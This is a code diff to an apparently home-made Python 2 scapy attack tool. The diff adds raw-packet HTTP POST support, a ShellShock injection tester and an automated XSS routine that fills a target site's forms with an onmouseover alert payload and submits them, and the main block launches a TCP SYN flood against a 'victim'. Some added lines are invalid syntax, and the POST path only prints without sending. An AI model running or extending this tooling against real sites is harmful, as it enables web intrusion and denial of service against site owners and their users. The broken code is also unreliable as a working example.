@@ -12,6 +12,7 @@ from scapy.all import *
 import threading
 import argparse
 import hashlib
+import urllib
 import random
 import Queue
 import copy
@@ -169,8 +170,7 @@ class HTTP(object):
         if page in self.get:
             self.get[page]['data'] = ''.join([self.get[page]['data_frag'][i] for i in sorted(self.get[page]['data_frag'].keys())])
 
-
-    def GET(self, page = '', con=None):
+    def request(self, req_funct, page = '', con=None, data =None):
 
         # Handshake
         if con == None:
@@ -180,18 +180,24 @@ class HTTP(object):
                 return HTTP.HOST_DOWN_ERROR
         else : syn_ack = con
 
-        # GET
-        con = self.__http_get(page, syn_ack)
+        # GET OR POST
+        con = req_funct(page, syn_ack, data)
 
         if con[TCP].flags & HTTP.RST: return HTTP.CON_RST_ERROR # If connection reseted => exit function
 
         # Close connection
         del(self.get[page]['data_frag']) # Useless after this point, so deleting
         if self.get[page]['code'] == 301: # 301: Moved permanently => calling GET recursively
-            return self.GET(self.get[page]['header']['Location'], con)
+            return self.request(req_funct, self.get[page]['header']['Location'], con, data)
         self.close(con, True)
 
         return self.get[page]
+
+    def POST(self, page = '', con=None, data={}):
+        return self.request(self.__http_post, page, con, data)
+
+    def GET(self, page = '', con=None):
+        return self.request(self.__http_get, page, con)
 
     def getForms(self, page):
         """
@@ -247,12 +253,33 @@ class HTTP(object):
         """
         return ''.join([i + ": " + self.request_header[i] + '\r\n' for i in self.request_header]) + '\r\n'
 
-    def __http_get(self, page, syn_ack):
-        q = Queue.Queue()
+    def __http_get(self, page, syn_ack, data=None):
 
         # Envoie de la requête GET
         getStr = 'GET /' + page + ' HTTP/1.1\r\n' + self.formatHeader()
-        request = IP(dst=self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / getStr
+
+        return self.__tcp_request(page, syn_ack, getStr)
+
+
+    def __http_post(self, page, syn_ack, data=''):
+        # Envoie de la requête GET
+        self.setHeader('Content-Type', 'application/x-www-form-urlencoded')
+        self.setHeader('Content-Length', str(len(data)))
+
+        postStr = 'POST /' + page + ' HTTP/1.1\r\n' + self.formatHeader()
+        postStr += data
+
+        del self.request_header['Content-Type']
+        del self.request_header['Content-Length']
+
+        print postStr
+        # return self.__tcp_request(page, syn_ack, postStr)
+
+
+    def __tcp_request(self, page, syn_ack, html_request):
+        q = Queue.Queue()
+
+        request = IP(dst=self.host) / TCP(dport=80, sport=syn_ack[TCP].dport, seq=syn_ack[TCP].ack, ack=syn_ack[TCP].seq + 1, flags='PA') / html_request
         repl, u = sr(request, multi=1, timeout=1, verbose=0)
 
         # On stocke tous les packets recus dans une file d'attente
@@ -297,7 +324,7 @@ class ShellShock(HTTP):
         self.target = script_page
 
     def test(self):
-        md5 = hashlib.md5(self.host + '/' + self.target).hexdigest()
+        md5 = getUniqueID() #hashlib.md5(self.host + '/' + self.target).hexdigest()
         pattern = "SHELL_SHOCK_WORK_HERE_" + md5
         self.run("echo; echo '" + pattern + "'")
         # pkts=sniff(filter="icmp", timeout=120,count=5)
@@ -327,33 +354,39 @@ class XSS():
         return selected_forms
 
     def printForms(self, forms):
-        for i in range(len(sf)):
+        for i in range(len(forms)):
             print "Form ID: ", i
-            print "Method: ", sf[i]['method']
-            print "Action: ", sf[i]['action']
+            print "Method: ", forms[i]['method']
+            print "Action: ", forms[i]['action']
             print "Inputs:"
-            for j in sf[i]['inputs']: print '\t- ', j, ': ', sf[i]['inputs'][j]['type'], sf[i]['inputs'][j]
+            for j in forms[i]['inputs']: print '\t- ', j, ': ', forms[i]['inputs'][j]['type'], forms[i]['inputs'][j]
             print '\n\n'
 
-    def fillForm(self, form, fv):
+    def fillForm(self, form, fv={}):
         data = {}
         for name in form['inputs']:
             inp = form['inputs'][name]
             if not 'name' in inp: continue
             if inp['type'] in ['reset', 'button', 'submit']: continue
 
+            # A améliorer (gestion de plus de types d'inputs)
             if inp['type'] in ['text', 'password', 'url', 'search']:
-                if i in fv: data[name] = fv[name]
-                else: data[name] = "xss testing"
+                if name in fv:
+                    data[name] = fv[name]
+                elif 'required' in inp and not (name in fv):
+                    data[name] = "xss testing"
+                else: data[name] = ""
 
-            # A modifier
-            else:
-                data[name] = ""
+            elif inp['type'] == 'radio':
+                data[name] = inp['value']
+            else: data[name] = ""
+
+            uid = getUniqueID()
+            data[self.fieldname] = "<a onmouseover=\"alert('" + uid + "')\"</script>"
         return data
 
     def run(self, fieldname, fieldvalue = {}):
         self.target.GET(self.page)
-        self.fieldname = fieldname
         self.fieldname = fieldname
 
         sf = self.selectForms(self.target.getForms(self.page))
@@ -368,7 +401,13 @@ class XSS():
             return 0
 
         form = sf[id]
-        print self.fillForm(form, fieldvalue)
+        formdata = urllib.urlencode(self.fillForm(form, fieldvalue))
+
+        if form['action'] == '': form_dest = self.page
+        else: form_dest = os.path.normpath(os.path.join(self.page, form['action']))
+
+        if form['method'].lower() == 'post' in  = self.target.POST(form_dest, data=formdata)
+        elif form['method'].lower() == 'get' in  = self.target.GET(form_dest + '?' + formdata)
 
 def parseTarget(target):
     target = target.replace('http://', '')
@@ -378,6 +417,9 @@ def parseTarget(target):
         host = target
         page = ''
     return host, page
+
+def getUniqueID():
+    return hashlib.md5(str(time.time())).hexdigest()
 
 if __name__ == "__main__":
     conf.L3socket=L3RawSocket
@@ -415,8 +457,8 @@ if __name__ == "__main__":
         victim.tcp_syn_flood()
 
 
-
-    #
+    ######  Debug zone  #######
+    # print HTTP("192.168.0.21").GET('')
     # html_rep = site.GET('groups/new.php')
     # html_rep = site.GET('index.nginx-debian.html')
     #
